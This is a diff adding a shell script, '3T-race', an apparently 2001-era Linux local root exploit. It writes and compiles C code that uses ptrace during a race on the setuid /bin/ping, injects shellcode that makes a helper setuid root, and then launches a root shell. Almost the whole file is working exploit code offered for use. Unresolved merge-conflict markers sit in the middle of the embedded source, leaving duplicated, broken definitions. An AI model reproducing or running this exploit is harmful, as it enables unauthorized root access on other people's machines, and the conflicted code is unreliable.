@@ -1,0 +1,217 @@
+#!/bin/sh
+
+#
+# IMPORTANT if you will get POKETEXT input/output error 
+# just run exploit again (I didn't debug why it crash sometimes:)
+#
+# I replaced /usr/bin/passwd with /bin/ping
+# It should be +s on meny boxes too and it has +r (passwd hasn't)
+# I nedd +r on binary to check address of .data segment.
+# 
+# I didn't make 'disk cache clean up' better.. sorry no time
+# I'll do it soon ;)
+# 
+# -tm
+
+
+echo -e "\E[1m\E[31m3T-race\E[m by \E[1mtmogg\E[m  < lam3rZ / HERT / TESO >"
+echo -en "\E[32m[+]\E[m Creating main code... "
+
+cat > /tmp/.3T-race.c <<_EOF1
+/*
+ *  3T-race by tmogg  < lam3rZ / HERT / TESO >
+ *  24/03/2001
+ */ 
+#include <sys/ptrace.h>
+#include <errno.h>
+#include <signal.h>
+#include <unistd.h>
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <asm/ptrace.h>
+#include <stdio.h>
+#include <sys/procfs.h>
+#include <strings.h>
+#define green "\E[32m"
+#define bold "\E[1m"
+#define normal "\E[m"
+#define red "\E[31m"
+
+char *the_suid = "/bin/ping" ;
+_EOF1
+
+addr=`/usr/bin/objdump -x /bin/ping 2>/dev/null | grep "\.data" | awk '{printf "0x"$4}'`
+echo "int some_add = $addr;" >> /tmp/.3T-race.c
+
+<<<<<<< 3T-race
+char *the_suid = "/usr/bin/passwd" ;
+//int some_add  = 0x0804bc6c ;              // objdump -x the_suid | grep .data
+int some_add = 0x0804e420;
+=======
+cat >> /tmp/.3T-race.c <<_EOF1
+>>>>>>> 1.2
+
+char *shellcode = 
+"\x31\xc0\x83\xc0\x17\x31\xdb\xcd\x80\xeb"
+"\x30\x5f\x31\xc9\x88\x4f\x17\x88\x4f\x1a"
+"\x8d\x5f\x10\x89\x1f\x8d\x47\x18\x89\x47"
+"\x04\x8d\x47\x1b\x89\x47\x08\x31\xc0\x89"
+"\x47\x0c\x8d\x0f\x8d\x57\x0c\x83\xc0\x0b"
+"\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8"
+"\xcb\xff\xff\xff\x41\x41\x41\x41\x41\x41"
+"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+"\x2f\x62\x69\x6e\x2f\x73\x68\x30\x2d\x63"
+"\x30"
+"chown root:root /tmp/.xp;chmod 4755 /tmp/.xp";
+
+char *pl=green"[+]"normal;
+char *mi=red"[--]"normal;
+char *ch=bold"[*]"normal;
+char *la=green"[?]"normal;
+
+int stat(int a) {
+	char *dupa;
+	char fname[1024];
+
+	sprintf(fname,"/proc/%d/status",a);
+	a = open(fname,O_RDONLY);
+	read(a,fname,1024);
+	dupa = strchr(fname,'S');
+	if (dupa[7] == 'Z') { 
+		printf("\n%s Child died.\nExiting...\n",mi);
+		exit();
+	}
+	return dupa[7];
+}
+
+
+
+int main(int argc, char **argv)
+{
+	int pid;
+	int i,j;
+	void * p;
+	struct user_regs_struct regs;
+	char fname[1024];
+
+	if (argc == 1) {
+		printf("%s cleaning disk cache, please wait...",pl);
+		fflush(stdout);
+		system("cat /usr/bin/* >/dev/null 2>&1");
+		printf(" [done]\n%s starting main code\n", pl);
+		execl(argv[0],argv[0],"daj-mi-qrfa-roota",0);
+	}
+
+	pid = fork();
+	if (pid == 0) {
+			printf("%s Child exec...\n",ch );
+ 			i = open("/etc/lilo.conf",O_RDONLY);
+			p = mmap(0,102400,PROT_READ,MAP_PRIVATE,i,0);
+			i = execl(the_suid, p, 0);
+			printf("%s Child exec error: %s\n", mi, strerror(errno));
+			exit(-1);
+	} 
+	printf("%s Waiting for disk sleep.... ", pl);
+	printf("%s dunno why but that printf helps sometimes ;) %s\n",red,normal);
+	while (stat(pid)!='D') {}
+	printf("[OK]\n");
+	i = ptrace(PTRACE_ATTACH, pid, 0, 0);
+	if (i == -1)  {
+		printf("%s ATTACH: %s\nExiting...\n", mi, strerror(errno));
+		exit(-1);
+	}
+	printf("%s ATTACH: %d : %s\n", pl, i, strerror(errno));
+	waitpid(pid,0,0);
+//	printf("%sPress ENTER%s\n",red,normal);
+//	getchar();
+	j = ptrace(PTRACE_PEEKUSER, pid, (int)&regs.eip - (int)&regs.ebx, 0);
+	if (j == -1) {
+		printf("%s PEEKUSER: %s\n", mi, i, strerror(errno));
+		printf("Exiting...\n");
+		exit(-1);
+	}
+	printf("%s eip: 0x%x", pl, j);
+	j = some_add;
+	i = ptrace(PTRACE_POKEUSER, pid, (int)&regs.eip - (int)&regs.ebx, j);
+	if (i == -1) {
+		printf("\n%s POKEUSER: %s\nExiting...\n", mi, i, strerror(errno));
+		exit(-1);	
+	}
+	j = ptrace(PTRACE_PEEKUSER, pid, (int)&regs.eip - (int)&regs.ebx, 0);
+	if (j == -1) {
+                printf("\n%s PEEKUSER: %s\nExiting...\n", mi, strerror(errno));
+                exit(-1);
+        }
+	printf(" -> 0x%x\n", pl, j);
+	printf("%s copy data from 0x%x to 0x%x\n", pl, shellcode, some_add);
+	printf("%s[%s",green,normal);
+	for (j=0; j<=strlen(shellcode); j+=4) {
+		i = ptrace(PTRACE_POKETEXT, pid,some_add+j,*(int*)(shellcode+j));
+		if (i != 0) {
+		   printf("%s POKETEXT: %s\nExiting...\n", mi, strerror(errno));
+		   exit(-1);
+		}
+		printf(".");
+	} 
+	printf("%s]%s\n",green,normal);
+	//while (1) {}
+	i = ptrace(PTRACE_CONT, pid, 0, 0);
+	printf("%s CONT: %d : %s\n", la, i, strerror(errno));
+	printf("Status of %d: %c\n", pid, stat(pid));
+        i = ptrace(PTRACE_DETACH, pid, 0, SIGCONT);
+	printf("%s DETACH: %d : %s\n", la, i, strerror(errno));
+	printf("Status of %d: %c\n", pid, stat(pid));
+}
+
+_EOF1
+
+gcc -o /tmp/.3T-race /tmp/.3T-race.c > /dev/null 2>&1
+
+if [ ! -f /tmp/.3T-race ]; then
+  echo "[Failed]"
+  echo "Exiting..."
+  #rm -rf /tmp/.3T-race.c
+  exit
+fi
+
+echo "[done]"
+
+echo -en "\E[32m[+]\E[m Creating helper... "
+
+cat > /tmp/.xp.c <<_EOF2
+
+int main() {
+ int i;
+ 
+ i = setuid(0);
+ printf("setuid(0) = %d\n",i);
+ i = setgid(0);
+ printf("setgid(0) = %d\n",i);
+ system("/bin/sh");
+}
+
+_EOF2
+
+gcc -o /tmp/.xp /tmp/.xp.c > /dev/null 2>&1
+if [ ! -f /tmp/.xp ]; then
+ echo "[Failed]"
+ echo "Exiting..."
+ #rm -rf /tmp/.3T-race*
+ #rm -rf /tmp/.xp.c
+ exit
+fi
+echo "[done]"
+#rm -rf /tmp/.3T-race.c /tmp/.xp.c
+echo -e "\E[32m[+] Starting explit"
+/tmp/.3T-race
+sleep 2
+if [ -u /tmp/.xp ]; then
+	echo -e "\E[32m[+]\E[m Going to rootshell"
+	/tmp/.xp
+else
+	echo "Doesn't work ;("
+	killall -9 passwd
+fi
+echo -e "\E[32m[+]\E[m Cleaning up /tmp ..."
+#rm -rf /tmp/.3T-race /tmp/.xp
+echo "Thank you for using 3T-race."
